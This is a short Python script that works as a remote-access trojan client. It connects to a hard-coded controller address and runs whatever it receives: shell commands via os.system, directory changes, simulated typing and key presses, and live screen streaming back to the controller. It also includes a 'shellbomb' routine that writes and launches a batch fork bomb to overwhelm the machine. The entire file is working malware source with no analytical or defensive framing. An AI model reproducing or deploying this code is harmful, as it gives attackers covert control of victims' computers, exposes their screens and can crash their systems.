import socket
import os
import pyautogui
from vidstream import ScreenShareClient

ip = "192.168.1.79"
port = 55555
run = True

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((ip, port))


def receive():
    data = client.recv(1024)
    return data.decode("ascii")


def terminal(command):
    os.system(command)


def cdAccess(cd):
    os.chdir(cd)


def shellbomb():
    f = open("shellbomb.bat", "w")
    f.write("@echo off\n:l\nstart\ngoto :l")
    f.close()
    os.system("shellbomb.bat")


def write(text):
    pyautogui.write(text)


def press(key):
    if key == "winleft":
        pyautogui.press("winleft")
    elif key == "enter":
        pyautogui.press("enter")
    elif key == "tab":
        pyautogui.press("tab")
    elif key[0:10] == "backspace(":
        number = int(key[10:len(key) - 1])
        for i in range(number):
            pyautogui.press("backspace")


def screen():
    sender = ScreenShareClient("192.168.1.79", 55556)
    sender.start_stream()


def execute(data):
    global run
    if data == "die":
        run = False
    elif data[0:2] == "cd":
        cdAccess(data[3:len(data)])
    elif data == "shellbomb":
        shellbomb()
    elif data[0:6] == "write(":
        write(data[6:len(data) - 1])
    elif data[0:6] == "press(":
        press(data[6:len(data) - 1])
    elif data == "screen":
        screen()
    else:
        terminal(data)


while run == True:
    execute(receive())